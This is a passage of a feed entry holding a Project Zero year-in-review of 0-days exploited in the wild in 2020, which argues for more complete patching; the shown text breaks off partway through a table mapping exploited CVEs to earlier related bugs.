    <title type="text">Déjà vu-lnerability</title>
    <content type="html">&lt;style type="text/css"&gt;@import url('https://themes.googleusercontent.com/fonts/css?kit=cGvuclDC_Z1vE_cnVEU6Ae_NZQ7StBcqH_vXVqoPMX0');.lst-kix_r9pow2tp8cv0-3&gt;li{counter-increment:lst-ctn-kix_r9pow2tp8cv0-3}ol.lst-kix_r9pow2tp8cv0-8.start{counter-reset:lst-ctn-kix_r9pow2tp8cv0-8 0}ol.lst-kix_rh2sjnt7clnl-5.start{counter-reset:lst-ctn-kix_rh2sjnt7clnl-5 0}.lst-kix_r9pow2tp8cv0-8&gt;li:before{content:"" counter(lst-ctn-kix_r9pow2tp8cv0-8,lower-roman) ". "}ol.lst-kix_r9pow2tp8cv0-5.start{counter-reset:lst-ctn-kix_r9pow2tp8cv0-5 0}ol.lst-kix_rh2sjnt7clnl-2.start{counter-reset:lst-ctn-kix_rh2sjnt7clnl-2 0}.lst-kix_xcgzvmnt5e4b-8&gt;li:before{content:"\0025a0  "}.lst-kix_r9pow2tp8cv0-4&gt;li:before{content:"(" counter(lst-ctn-kix_r9pow2tp8cv0-4,lower-latin) ") "}.lst-kix_r9pow2tp8cv0-6&gt;li:before{content:"" counter(lst-ctn-kix_r9pow2tp8cv0-6,decimal) ". "}.lst-kix_r9pow2tp8cv0-3&gt;li:before{content:"(" counter(lst-ctn-kix_r9pow2tp8cv0-3,decimal) ") "}.lst-kix_r9pow2tp8cv0-7&gt;li:before{content:"" counter(lst-ctn-kix_r9pow2tp8cv0-7,lower-latin) ". "}.lst-kix_rh2sjnt7clnl-0&gt;li{counter-increment:lst-ctn-kix_rh2sjnt7clnl-0}.lst-kix_r9pow2tp8cv0-4&gt;li{counter-increment:lst-ctn-kix_r9pow2tp8cv0-4}ol.lst-kix_rh2sjnt7clnl-8.start{counter-reset:lst-ctn-kix_rh2sjnt7clnl-8 0}.lst-kix_r9pow2tp8cv0-5&gt;li:before{content:"(" counter(lst-ctn-kix_r9pow2tp8cv0-5,lower-roman) ") "}.lst-kix_ir94vkdxrs7o-0&gt;li:before{content:"\0025cf  "}.lst-kix_ir94vkdxrs7o-2&gt;li:before{content:"\0025a0  "}ul.lst-kix_ir94vkdxrs7o-0{list-style-type:none}ul.lst-kix_ir94vkdxrs7o-1{list-style-type:none}.lst-kix_ir94vkdxrs7o-3&gt;li:before{content:"\0025cf  "}ul.lst-kix_ir94vkdxrs7o-2{list-style-type:none}ul.lst-kix_ir94vkdxrs7o-3{list-style-type:none}ul.lst-kix_ir94vkdxrs7o-4{list-style-type:none}ul.lst-kix_ir94vkdxrs7o-5{list-style-type:none}.lst-kix_r9pow2tp8cv0-0&gt;li:before{content:"" counter(lst-ctn-kix_r9pow2tp8cv0-0,decimal) ") "}.lst-kix_r9pow2tp8cv0-2&gt;li:before{content:"" counter(lst-ctn-kix_r9pow2tp8cv0-2,lower-roman) ") "}ul.lst-kix_ir94vkdxrs7o-6{list-style-type:none}.lst-kix_r9pow2tp8cv0-5&gt;li{counter-increment:lst-ctn-kix_r9pow2tp8cv0-5}ul.lst-kix_ir94vkdxrs7o-7{list-style-type:none}ul.lst-kix_ir94vkdxrs7o-8{list-style-type:none}.lst-kix_ir94vkdxrs7o-1&gt;li:before{content:"\0025cb  "}.lst-kix_r9pow2tp8cv0-1&gt;li:before{content:"" counter(lst-ctn-kix_r9pow2tp8cv0-1,lower-latin) ") "}.lst-kix_rh2sjnt7clnl-1&gt;li{counter-increment:lst-ctn-kix_rh2sjnt7clnl-1}.lst-kix_r9pow2tp8cv0-2&gt;li{counter-increment:lst-ctn-kix_r9pow2tp8cv0-2}ol.lst-kix_r9pow2tp8cv0-2.start{counter-reset:lst-ctn-kix_r9pow2tp8cv0-2 0}.lst-kix_wa1quvbznvvl-0&gt;li:before{content:"\0025cf  "}.lst-kix_wa1quvbznvvl-1&gt;li:before{content:"\0025cb  "}.lst-kix_r9pow2tp8cv0-0&gt;li{counter-increment:lst-ctn-kix_r9pow2tp8cv0-0}ol.lst-kix_r9pow2tp8cv0-3.start{counter-reset:lst-ctn-kix_r9pow2tp8cv0-3 0}.lst-kix_rh2sjnt7clnl-0&gt;li:before{content:"" counter(lst-ctn-kix_rh2sjnt7clnl-0,decimal) ") "}.lst-kix_rh2sjnt7clnl-1&gt;li:before{content:"" counter(lst-ctn-kix_rh2sjnt7clnl-1,lower-latin) ") "}.lst-kix_r9pow2tp8cv0-6&gt;li{counter-increment:lst-ctn-kix_r9pow2tp8cv0-6}ul.lst-kix_xcgzvmnt5e4b-8{list-style-type:none}.lst-kix_wa1quvbznvvl-2&gt;li:before{content:"\0025a0  "}.lst-kix_rh2sjnt7clnl-2&gt;li{counter-increment:lst-ctn-kix_rh2sjnt7clnl-2}.lst-kix_rh2sjnt7clnl-3&gt;li:before{content:"(" counter(lst-ctn-kix_rh2sjnt7clnl-3,decimal) ") "}.lst-kix_wa1quvbznvvl-4&gt;li:before{content:"\0025cb  "}.lst-kix_wa1quvbznvvl-5&gt;li:before{content:"\0025a0  "}.lst-kix_wa1quvbznvvl-3&gt;li:before{content:"\0025cf  "}.lst-kix_rh2sjnt7clnl-2&gt;li:before{content:"" counter(lst-ctn-kix_rh2sjnt7clnl-2,lower-roman) ") "}.lst-kix_ir94vkdxrs7o-8&gt;li:before{content:"\0025a0  "}ol.lst-kix_rh2sjnt7clnl-3.start{counter-reset:lst-ctn-kix_rh2sjnt7clnl-3 0}.lst-kix_ir94vkdxrs7o-6&gt;li:before{content:"\0025cf  "}.lst-kix_ir94vkdxrs7o-7&gt;li:before{content:"\0025cb  "}.lst-kix_ir94vkdxrs7o-4&gt;li:before{content:"\0025cb  "}.lst-kix_ir94vkdxrs7o-5&gt;li:before{content:"\0025a0  "}ol.lst-kix_r9pow2tp8cv0-4.start{counter-reset:lst-ctn-kix_r9pow2tp8cv0-4 0}.lst-kix_rh2sjnt7clnl-8&gt;li:before{content:"" counter(lst-ctn-kix_rh2sjnt7clnl-8,lower-roman) ". "}.lst-kix_wa1quvbznvvl-8&gt;li:before{content:"\0025a0  "}.lst-kix_wa1quvbznvvl-6&gt;li:before{content:"\0025cf  "}.lst-kix_rh2sjnt7clnl-7&gt;li:before{content:"" counter(lst-ctn-kix_rh2sjnt7clnl-7,lower-latin) ". "}.lst-kix_rh2sjnt7clnl-8&gt;li{counter-increment:lst-ctn-kix_rh2sjnt7clnl-8}.lst-kix_rh2sjnt7clnl-4&gt;li:before{content:"(" counter(lst-ctn-kix_rh2sjnt7clnl-4,lower-latin) ") "}.lst-kix_rh2sjnt7clnl-5&gt;li:before{content:"(" counter(lst-ctn-kix_rh2sjnt7clnl-5,lower-roman) ") "}.lst-kix_rh2sjnt7clnl-5&gt;li{counter-increment:lst-ctn-kix_rh2sjnt7clnl-5}.lst-kix_wa1quvbznvvl-7&gt;li:before{content:"\0025cb  "}.lst-kix_rh2sjnt7clnl-6&gt;li:before{content:"" counter(lst-ctn-kix_rh2sjnt7clnl-6,decimal) ". "}ol.lst-kix_rh2sjnt7clnl-0{list-style-type:none}ol.lst-kix_rh2sjnt7clnl-1{list-style-type:none}.lst-kix_r9pow2tp8cv0-8&gt;li{counter-increment:lst-ctn-kix_r9pow2tp8cv0-8}ol.lst-kix_r9pow2tp8cv0-1.start{counter-reset:lst-ctn-kix_r9pow2tp8cv0-1 0}.lst-kix_z1i3uqhq0nom-7&gt;li:before{content:"\0025cb  "}.lst-kix_z1i3uqhq0nom-8&gt;li:before{content:"\0025a0  "}ul.lst-kix_wa1quvbznvvl-4{list-style-type:none}ul.lst-kix_wa1quvbznvvl-5{list-style-type:none}ul.lst-kix_wa1quvbznvvl-6{list-style-type:none}ul.lst-kix_wa1quvbznvvl-7{list-style-type:none}ul.lst-kix_wa1quvbznvvl-0{list-style-type:none}.lst-kix_rh2sjnt7clnl-6&gt;li{counter-increment:lst-ctn-kix_rh2sjnt7clnl-6}ul.lst-kix_wa1quvbznvvl-1{list-style-type:none}ul.lst-kix_wa1quvbznvvl-2{list-style-type:none}ul.lst-kix_wa1quvbznvvl-3{list-style-type:none}ol.lst-kix_rh2sjnt7clnl-1.start{counter-reset:lst-ctn-kix_rh2sjnt7clnl-1 0}ul.lst-kix_wa1quvbznvvl-8{list-style-type:none}.lst-kix_rh2sjnt7clnl-4&gt;li{counter-increment:lst-ctn-kix_rh2sjnt7clnl-4}ul.lst-kix_xcgzvmnt5e4b-3{list-style-type:none}ul.lst-kix_xcgzvmnt5e4b-2{list-style-type:none}ul.lst-kix_xcgzvmnt5e4b-1{list-style-type:none}ol.lst-kix_rh2sjnt7clnl-4.start{counter-reset:lst-ctn-kix_rh2sjnt7clnl-4 0}ul.lst-kix_xcgzvmnt5e4b-0{list-style-type:none}ul.lst-kix_xcgzvmnt5e4b-7{list-style-type:none}ul.lst-kix_xcgzvmnt5e4b-6{list-style-type:none}ul.lst-kix_xcgzvmnt5e4b-5{list-style-type:none}ul.lst-kix_xcgzvmnt5e4b-4{list-style-type:none}ol.lst-kix_rh2sjnt7clnl-0.start{counter-reset:lst-ctn-kix_rh2sjnt7clnl-0 0}ol.lst-kix_rh2sjnt7clnl-7.start{counter-reset:lst-ctn-kix_rh2sjnt7clnl-7 0}ol.lst-kix_r9pow2tp8cv0-5{list-style-type:none}ol.lst-kix_r9pow2tp8cv0-6{list-style-type:none}ol.lst-kix_r9pow2tp8cv0-7{list-style-type:none}ol.lst-kix_r9pow2tp8cv0-8{list-style-type:none}.lst-kix_rh2sjnt7clnl-7&gt;li{counter-increment:lst-ctn-kix_rh2sjnt7clnl-7}ol.lst-kix_r9pow2tp8cv0-6.start{counter-reset:lst-ctn-kix_r9pow2tp8cv0-6 0}.lst-kix_r9pow2tp8cv0-7&gt;li{counter-increment:lst-ctn-kix_r9pow2tp8cv0-7}.lst-kix_r9pow2tp8cv0-1&gt;li{counter-increment:lst-ctn-kix_r9pow2tp8cv0-1}.lst-kix_rh2sjnt7clnl-3&gt;li{counter-increment:lst-ctn-kix_rh2sjnt7clnl-3}ol.lst-kix_rh2sjnt7clnl-6.start{counter-reset:lst-ctn-kix_rh2sjnt7clnl-6 0}.lst-kix_xcgzvmnt5e4b-0&gt;li:before{content:"\0025cf  "}.lst-kix_xcgzvmnt5e4b-1&gt;li:before{content:"\0025cb  "}.lst-kix_z1i3uqhq0nom-1&gt;li:before{content:"\0025cb  "}.lst-kix_z1i3uqhq0nom-3&gt;li:before{content:"\0025cf  "}.lst-kix_xcgzvmnt5e4b-2&gt;li:before{content:"\0025a0  "}.lst-kix_z1i3uqhq0nom-2&gt;li:before{content:"\0025a0  "}.lst-kix_z1i3uqhq0nom-6&gt;li:before{content:"\0025cf  "}.lst-kix_z1i3uqhq0nom-5&gt;li:before{content:"\0025a0  "}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_xcgzvmnt5e4b-7&gt;li:before{content:"\0025cb  "}ol.lst-kix_r9pow2tp8cv0-0.start{counter-reset:lst-ctn-kix_r9pow2tp8cv0-0 0}.lst-kix_z1i3uqhq0nom-4&gt;li:before{content:"\0025cb  "}ol.lst-kix_r9pow2tp8cv0-1{list-style-type:none}ol.lst-kix_rh2sjnt7clnl-2{list-style-type:none}ol.lst-kix_r9pow2tp8cv0-2{list-style-type:none}ol.lst-kix_rh2sjnt7clnl-3{list-style-type:none}ol.lst-kix_r9pow2tp8cv0-3{list-style-type:none}ol.lst-kix_rh2sjnt7clnl-4{list-style-type:none}ol.lst-kix_r9pow2tp8cv0-4{list-style-type:none}ol.lst-kix_rh2sjnt7clnl-5{list-style-type:none}.lst-kix_xcgzvmnt5e4b-6&gt;li:before{content:"\0025cf  "}ul.lst-kix_z1i3uqhq0nom-8{list-style-type:none}ol.lst-kix_rh2sjnt7clnl-6{list-style-type:none}ul.lst-kix_z1i3uqhq0nom-7{list-style-type:none}ol.lst-kix_rh2sjnt7clnl-7{list-style-type:none}.lst-kix_xcgzvmnt5e4b-5&gt;li:before{content:"\0025a0  "}ol.lst-kix_rh2sjnt7clnl-8{list-style-type:none}ol.lst-kix_r9pow2tp8cv0-0{list-style-type:none}.lst-kix_xcgzvmnt5e4b-4&gt;li:before{content:"\0025cb  "}ul.lst-kix_z1i3uqhq0nom-4{list-style-type:none}ul.lst-kix_z1i3uqhq0nom-3{list-style-type:none}ol.lst-kix_r9pow2tp8cv0-7.start{counter-reset:lst-ctn-kix_r9pow2tp8cv0-7 0}ul.lst-kix_z1i3uqhq0nom-6{list-style-type:none}ul.lst-kix_z1i3uqhq0nom-5{list-style-type:none}ul.lst-kix_z1i3uqhq0nom-0{list-style-type:none}.lst-kix_xcgzvmnt5e4b-3&gt;li:before{content:"\0025cf  "}ul.lst-kix_z1i3uqhq0nom-2{list-style-type:none}.lst-kix_z1i3uqhq0nom-0&gt;li:before{content:"\0025cf  "}ul.lst-kix_z1i3uqhq0nom-1{list-style-type:none}ol{margin:0;padding:0}table td,table th{padding:0}.c28{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#e0e0e0;border-bottom-style:solid}.c30{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:174.8pt;border-top-color:#000000;border-bottom-style:solid}.c32{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:137.2pt;border-top-color:#000000;border-bottom-style:solid}.c12{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:156pt;border-top-color:#000000;border-bottom-style:solid}.c38{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#000000;border-bottom-style:solid}.c9{padding-top:20pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;text-align:left}.c7{padding-top:16pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;text-align:left}.c42{padding-top:0pt;padding-bottom:16pt;line-height:1.5;page-break-after:avoid;text-align:left}.c36{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;text-align:left}.c37{-webkit-text-decoration-skip:none;text-decoration:underline;vertical-align:baseline;text-decoration-skip-ink:none;font-style:normal}.c17{border-spacing:0;border-collapse:collapse;margin-right:auto}.c2{font-size:10pt;font-family:Consolas,"Courier New";color:#000000;font-weight:400}.c11{color:#000000;font-weight:400;font-size:11pt;font-family:"Arial"}.c27{color:#000000;font-weight:400;font-size:20pt;font-family:"Arial"}.c33{color:#000000;font-weight:400;font-size:16pt;font-family:"Arial"}.c8{font-size:10pt;font-family:Consolas,"Courier New";color:#3367d6;font-weight:400}.c0{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.c5{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c18{font-size:10pt;font-family:Consolas,"Courier New";color:#455a64;font-weight:400}.c1{font-size:10pt;font-family:Consolas,"Courier New";color:#616161;font-weight:400}.c16{color:#434343;font-weight:400;font-size:14pt;font-family:"Arial"}.c46{color:#666666;font-weight:400;font-size:15pt;font-family:"Arial"}.c34{font-size:10pt;font-family:Consolas,"Courier New";color:#0f9d58;font-weight:400}.c20{font-size:10pt;font-family:Consolas,"Courier New";color:#c53929;font-weight:400}.c6{font-size:10pt;font-family:Consolas,"Courier New";color:#9c27b0;font-weight:400}.c25{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c29{font-size:10pt;font-family:Consolas,"Courier New";color:#000000}.c44{font-size:10pt;font-family:Consolas,"Courier New";color:#9c27b0}.c24{font-size:10pt;font-family:Consolas,"Courier New";color:#3367d6}.c40{-webkit-text-decoration-skip:none;text-decoration:underline;text-decoration-skip-ink:none}.c43{color:#000000;font-size:11pt;font-family:"Arial"}.c39{font-size:10pt;font-family:Consolas,"Courier New";color:#616161}.c45{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c23{font-family:Consolas,"Courier New";color:#0d904f;font-weight:400}.c4{text-decoration:none;vertical-align:baseline;font-style:normal}.c22{margin-left:36pt;padding-left:0pt}.c3{orphans:2;widows:2}.c41{padding:0;margin:0}.c21{color:inherit;text-decoration:inherit}.c13{height:11pt}.c10{background-color:#ea9999}.c31{font-style:italic}.c15{background-color:#ffff00}.c19{font-weight:700}.c14{background-color:#b6d7a8}.c26{height:0pt}.c35{height:21pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class="c45"&gt;&lt;p class="c3 c42 subtitle" id="h.g01b955lvcgn"&gt;&lt;span class="c4 c46"&gt;A Year in Review of 0-days Exploited In-The-Wild in 2020&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span class="c11 c4"&gt;Posted by Maddie Stone, Project Zero&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;2020 was a year full of 0-day exploits. Many of the Internet&amp;rsquo;s most popular browsers had their moment in the spotlight. Memory corruption is &lt;/span&gt;&lt;span class="c31"&gt;still&lt;/span&gt;&lt;span&gt;&amp;nbsp;the name of the game and how the vast majority of detected 0-days are getting in. While we tried new methods of 0-day detection with modest success, 2020 showed us that there is still a long way to go in detecting these 0-day exploits in-the-wild. But what may be the most notable fact is that&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;25% of the 0-days detected in 2020 are c&lt;/span&gt;&lt;span&gt;losely related to&lt;/span&gt;&lt;span&gt;&amp;nbsp;previously publicly disclosed vulnerabilities.&lt;/span&gt;&lt;span&gt;&amp;nbsp;In other words,&lt;/span&gt;&lt;span class="c19"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;1 out of every 4 detected 0-day exploits could potentially have been avoided if a more thorough investigation and patching effort were explored&lt;/span&gt;&lt;span class="c19"&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Across the industry, incomplete patches &amp;mdash; patches that don&amp;rsquo;t correctly and comprehensively fix the root cause of a vulnerability &amp;mdash; allow attackers to use 0-days against users with less effort.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;Since mid-2019, Project Zero has dedicated an effort specifically to track, analyze, and learn from 0-days that are actively exploited in-the-wild. For the last 6 years, Project Zero&amp;rsquo;s mission has been to &amp;ldquo;make 0-day hard&amp;rdquo;. From that came the goal of our in-the-wild program: &amp;ldquo;Learn from 0-days exploited in-the-wild in order to make 0-day hard.&amp;rdquo; In order to ensure our work is &lt;/span&gt;&lt;span class="c31"&gt;actually&lt;/span&gt;&lt;span&gt;&amp;nbsp;making it harder to exploit 0-days, we need to &lt;/span&gt;&lt;span&gt;understand how 0-days are&lt;/span&gt;&lt;span class="c31"&gt;&amp;nbsp;actually&lt;/span&gt;&lt;span&gt;&amp;nbsp;being used&lt;/span&gt;&lt;span&gt;. Continuously pushing forward the public&amp;rsquo;s understanding of&lt;/span&gt;&lt;span&gt;&amp;nbsp;0-day exploitation&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;is only helpful when it doesn&amp;rsquo;t diverge from the &amp;ldquo;private state-of-the-art&amp;rdquo;, what attackers are doing and are capable of. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;Over the last 18 months, we&amp;rsquo;ve learned a lot about the active exploitation of 0-days and our work has matured and evolved with it. &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://googleprojectzero.blogspot.com/2020/07/detection-deficit-year-in-review-of-0.html"&gt;For the 2nd year in a row&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, we&amp;rsquo;re publishing a &amp;ldquo;Year in Review&amp;rdquo; report of the previous year&amp;rsquo;s detected 0-day exploits. The goal of this report is not to detail each individual exploit, but instead to analyze the exploits from the year as a group, looking for trends, gaps, lessons learned, successes, etc. If you&amp;rsquo;re interested in each individual exploit&amp;rsquo;s analysis, please check out our&lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://googleprojectzero.blogspot.com/p/rca.html"&gt;&amp;nbsp;root cause analyses&lt;/a&gt;&lt;/span&gt;&lt;span class="c11 c4"&gt;. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;When looking at the 24 0-days detected in-the-wild in 2020, there&amp;rsquo;s an undeniable conclusion: &lt;/span&gt;&lt;span class="c19"&gt;increasing investment in correct and comprehensive patches is a huge opportunity for our industry to impact attackers using 0-days.&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;A correct patch is one that fixes a bug with complete accuracy, &lt;/span&gt;&lt;span&gt;meaning the patch no longer allows any exploitation of the vulnerability&lt;/span&gt;&lt;span class="c11 c4"&gt;. A comprehensive patch applies that fix everywhere that it needs to be applied, covering all of the variants. We consider a patch to be complete only when it is both correct and comprehensive. When exploiting a single vulnerability or bug, there are often multiple ways to trigger the vulnerability, or multiple paths to access it. Many times we&amp;rsquo;re seeing vendors block only the path that is shown in the proof-of-concept or exploit sample, rather than fixing the vulnerability as a whole, which would block all of the paths. Similarly, security researchers are often reporting bugs without following up on how the patch works and exploring related attacks.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;While the idea that incomplete patches are making it easier for attackers to exploit 0-days may be uncomfortable,&lt;/span&gt;&lt;span&gt;&amp;nbsp;the converse of this conclusion can give us hope. We have a clear path toward making 0-days harder.&lt;/span&gt;&lt;span class="c19"&gt;&amp;nbsp;If more vulnerabilities are patched correctly and comprehensively, it will be harder for&lt;/span&gt;&lt;span class="c19"&gt;&amp;nbsp;attackers to exploit &lt;/span&gt;&lt;span class="c4 c19 c43"&gt;0-days.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c9 c3" id="h.pjwf2y1do0f0"&gt;&lt;span class="c27 c4"&gt;This vulnerability looks familiar &amp;#x1f914;&lt;/span&gt;&lt;/h1&gt;&lt;p class="c0 c3"&gt;&lt;span class="c11 c4"&gt;As stated in the introduction, 2020 included 0-day exploits that are similar to ones we&amp;rsquo;ve seen before. 6 of 24 0-days exploits detected in-the-wild are closely related to publicly disclosed vulnerabilities. Some of these 0-day exploits only had to change a line or two of code to have a new working 0-day exploit. This section explains how each of these 6 actively exploited 0-days are related to a previously seen vulnerability. We&amp;rsquo;re taking the time to detail each and show the minimal differences between the vulnerabilities to demonstrate that once you understand one of the vulnerabilities, it&amp;rsquo;s much easier to then exploit another.&lt;br&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.b74f5f217f98f20b760791f8e1d63f313284b751"&gt;&lt;/a&gt;&lt;a id="t.0"&gt;&lt;/a&gt;&lt;table class="c17"&gt;&lt;tbody&gt;&lt;tr class="c26"&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;Product&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c30" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;Vulnerability exploited in-the-wild&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c32" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;Variant of...&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c26"&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;Microsoft Internet Explorer&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c30" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;CVE-2020-0674&lt;/span&gt;&lt;/p&gt;&lt;p class="c25 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c32" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;CVE-2018-8653* CVE-2019-1367* CVE-2019-1429*&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c26"&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;Mozilla Firefox&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c30" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;CVE-2020-6820&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c32" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span&gt;Mozilla &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://bugzilla.mozilla.org/show_bug.cgi?id=1507180"&gt;Bug 1507180&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c26"&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;Google Chrome&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c30" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;CVE-2020-6572&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c32" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;CVE-2019-5870&lt;/span&gt;&lt;/p&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;CVE-2019-13695&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c26"&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;Microsoft Windows&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c30" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;CVE-2020-0986&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c32" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;CVE-2019-0880*&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c26"&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;Google Chrome/Freetype&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c30" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;CVE-2020-15999&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c32" colspan="1" 